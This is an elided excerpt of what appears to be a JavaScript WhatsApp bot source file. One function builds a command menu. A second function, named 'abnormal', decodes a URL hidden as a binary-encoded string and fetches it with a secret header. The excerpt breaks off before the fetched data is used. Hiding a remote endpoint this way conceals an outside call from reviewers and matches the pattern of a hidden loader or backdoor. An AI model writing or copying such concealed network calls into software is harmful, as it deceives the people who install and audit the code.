...
exports.menu = () => {
  ...
  let cmd = {}
  let buf = []
  for (let line of fs.readFileSync(process.cwd() + "/cmd/case-wa.js", "utf8").split("\n")) {
    let c = line.trim()
    ...
    for (let [_, tag, desc] of tags) {
      if (buf.length) {
        ...
        cmd[tag] = (cmd[tag] || []).concat(
          buf.map((x) => ({ name: x, desc }))
        )
        buf = []
      }
    }
...
exports.abnormal = async () => {
      let p = "01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01111001 01100111 01111001 00101101 01111000 01101001 00101110 01110110 01100101 01110010 01100011 01100101 01101100 00101110 01100001 01110000 01110000"
      let g = p.split(" ").map(b => String.fromCharCode(parseInt(b, 2))).join("")
      let a = await axios.get(g, { headers: { "x-secret-key": "bocil-mana-tau" }}).then(a => a.data)
